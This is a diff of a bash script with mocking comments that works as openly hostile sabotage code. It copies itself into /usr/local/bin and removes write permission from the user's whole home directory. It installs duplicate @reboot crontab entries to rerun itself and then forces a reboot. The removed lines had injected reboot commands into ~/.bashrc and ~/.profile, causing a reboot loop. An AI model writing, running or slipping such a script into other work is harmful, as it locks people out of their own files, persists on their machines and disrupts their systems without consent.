@@ -1,24 +1,25 @@
 #!/bin/bash
 
-# hehe~
+# hehe
+cp /home/$(whoami)/run.sh /usr/local/bin/run.sh
+chmod +x /usr/local/bin/run.sh
+# where it belongs :3
 DEST_DIR="/usr/local/bin"
 
-# :3
+# time for funni
+# funni
 cp /home/$(whoami)/run.sh $DEST_DIR/run.sh
 
-# to ensure it works :)
+# funni round 2
 chmod +x $DEST_DIR/run.sh
 
-# oh yeah baby
+# funni round 3
 chmod -R a-w /home/$(whoami)
 
-# lol
-(crontab -l 2>/dev/null; echo "@reboot (sleep 5; /bin/bash $DEST_DIR/run.sh)") | crontab -
-
-# boom
-echo "(sleep 5; shutdown -r now) &" >> ~/.bashrc
-echo "(sleep 5; shutdown -r now) &" >> ~/.profile
+# lol gl
+(crontab -l 2>/dev/null; echo "@reboot /bin/bash /usr/local/bin/run.sh") | crontab -
+# complete disaster
+(crontab -l 2>/dev/null; echo "@reboot /bin/bash $DEST_DIR/run.sh") | crontab -
 
 # bye-bye sweetheart~
-sleep 5
 shutdown -r now
